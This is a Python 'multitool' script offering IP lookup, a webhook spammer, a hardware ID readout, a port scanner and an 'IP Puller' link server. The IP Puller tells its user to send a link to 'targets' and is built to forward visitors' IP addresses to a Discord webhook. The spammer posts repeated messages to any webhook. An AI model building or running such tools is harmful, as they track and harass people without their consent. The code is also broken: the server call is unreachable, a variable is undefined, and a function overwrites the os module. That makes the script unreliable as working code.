import requests as r
import os as o
import platform as p
import subprocess as s
import socket as sk
import sys as y
from datetime import datetime as dt
import pyfiglet as pf
import threading as t
from flask import Flask as f, request as req
import time as tm

a = f(__name__)

def g():
    try:
        e = r.get('https://api.ipify.org?format=json')
        return e.json().get('ip')
    except r.RequestException as e:
        print(f"Err fetching IP from ipify: {e}")
        return None

@a.route('/', methods=['GET'])
def q():
    z = req.headers.get('X-Forwarded-For', req.remote_addr).split(',')[0]  
    print(f"[+] Visitor IP: {z}")

    if v:
        try:
            r.post(v, json={"content": f"New visitor IP: {z}"})
        except r.RequestException as e:
            print(f"Err sending IP to webhook: {e}")

    return f"Visitor's Public IP: {z}"

def w(v):
    while True:
        h = g()
        if h:
            try:
                r.post(v, json={"content": f"New visitor IP: {h}"})
            except Exception as e:
                print(f"Webhook err: {e}")
            print(f"[+] Visitor IP: {h}")
        tm.sleep(5)

    a.run(host="0.0.0.0", port=8080, use_reloader=False)

l = """
\033[36m  █████████  ███████████   ███████████ ███████████    ██            ██████   ██████  █████                      ████ 
\033[38;5;208m  ███░░░░░███░░███░░░░░███ ░█░░░███░░░█░░███░░░░░███  ███           ░░██████ ██████  ░░███                      ░░███ 
\033[36m ███     ░░░  ░███    ░███ ░   ░███  ░  ░███    ░███ ░░░   █████     ░███░█████░███  ███████    ██████   ██████  ░███ 
\033[38;5;208m░███          ░██████████      ░███     ░██████████       ███░░      ░███░░███ ░███ ░░░███░    ███░░███ ███░░███ ░███ 
\033[36m░███          ░███░░░░░███     ░███     ░███░░░░░███     ░░█████     ░███ ░░░  ░███   ░███    ░███ ░███░███ ░███ ░███ 
\033[38;5;208m░░███     ███ ░███    ░███     ░███     ░███    ░███      ░░░░███    ░███      ░███   ░███ ███░███ ░███░███ ░███ ░███ 
\033[36m ░░█████████  █████   █████    █████    █████   █████     ██████     █████     █████  ░░█████ ░░██████ ░░██████  █████
\033[38;5;208m  ░░░░░░░░░  ░░░░░   ░░░░░    ░░░░░    ░░░░░   ░░░░░     ░░░░░░     ░░░░░     ░░░░░    ░░░░░░   ░░░░░░  ░░░░░ 
\033[0m
"""

def k(b, c):
    if p.system() == "Windows":
        s.call(f"mode con: cols={b} lines={c}", shell=True)
    else:  
        print(f"\033[8;{c};{b}t", end='')

def m():
    o.system("cls" if o.name == "nt" else "clear")

def n():
    try:
        d = {}
        if p.system() == "Windows":
            q = {
                "CPU Serial": "wmic cpu get ProcessorID",
                "Disk Drive": "wmic diskdrive get SerialNumber",
                "Motherboard Serial": "wmic baseboard get SerialNumber"
            }
            for n, q in q.items():
                f = s.getoutput(q).strip().split('\n')[1]
                d[n] = f.strip()
        else:  
            d['CPU Serial'] = s.getoutput("sysctl -n machdep.cpu.brand_string").strip()
            d['Disk Drive'] = s.getoutput("diskutil info / | grep 'Device Identifier'").split(': ')[1]
            d['Motherboard Serial'] = "N/A"

        return d

    except Exception as e:
        print(f"Err retrieving hw info: {e}")
        return None

def o():
    j = pf.figlet_format("CRTR's PORT SCANNER")
    print(j)

    t = input("Enter the target IP or hostname: ")
    try:
        t_ip = sk.gethostbyname(t)
    except sk.gaierror:
        print("Hostname not resolved. Exiting...")
        return

    print("-" * 50)
    print(f"Scanning Target: {t_ip}")
    print("Scanning started at: " + str(dt.now()))
    print("-" * 50)

    try:
        for p in range(1, 65535):
            v = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
            sk.setdefaulttimeout(1)
            r = v.connect_ex((t_ip, p))
            if r == 0:
                print(f"Port {p} is open")
            v.close()
    except KeyboardInterrupt:
        print("\nExiting Program !!!!")
    except sk.error:
        print("\nServer not responding !!!!")

k(151, 44)

while True:
    m()
    print(l)
    print("CRTR's Multitool")
    print("[1] IP Lookup")
    print("[2] Webhook Sender")
    print("[3] Show HWID")
    print("[4] IP Puller (From Link)")
    print("[5] Port Scanner")
    print("[6] Exit")

    x = input("Select an Option: ")

    if x == "1":
        m()
        print("IP Lookup")
        ip = input("Enter an IP Address:  ")
        try:
            resp = r.get(f"http://ipwho.is/{ip}?output=json")
            z = resp.json()
            if not z.get("success", False):
                print("Err: Unable to fetch IP data.")
            else:
                print("Results: \n")
                for k, v in z.items():
                    print(f"{k.capitalize()}: {v}")
        except r.exceptions.RequestException as e:
            print(f"Err fetching IP data: {e}")

    elif x == "2":
        print("\033[36mWebhook Spammer\n")
        wurl = input("Webhook URL: \033[0m")
        msg = input("Message: \033[0m")
        nm = input("Name: \033[0m")

        while True:
            dt = {"content": msg, "username": nm}
            try:
                resp = r.post(wurl, json=dt)
                print("Msg sent successfully.")
            except r.exceptions.RequestException:
                print("Err sending msg to webhook.")

            if input("Press Enter for more or type 'exit' to stop: ").strip().lower() == 'exit':
                break

    elif x == "3":
        print("\033[38;5;208mHWID \n")
        hw_info = n()
        if hw_info:
            for k, v in hw_info.items():
                print(f"\033[38;5;208m{k}: {v}\033[0m")
        input("Press Enter to continue...")

    elif x == "4":
        m()
        print("Starting IP Puller (Port 8080)")
        webhook = input("Enter Discord webhook URL: ")
        t.Thread(target=w, args=(webhook,), daemon=True).start()
        input("Server is running! Send your link (your IP:8080) to targets.\nPress Enter to return to menu...")

    elif x == "5":
        m()
        o()
        input("Press Enter to continue...")

    elif x == "6":
        break
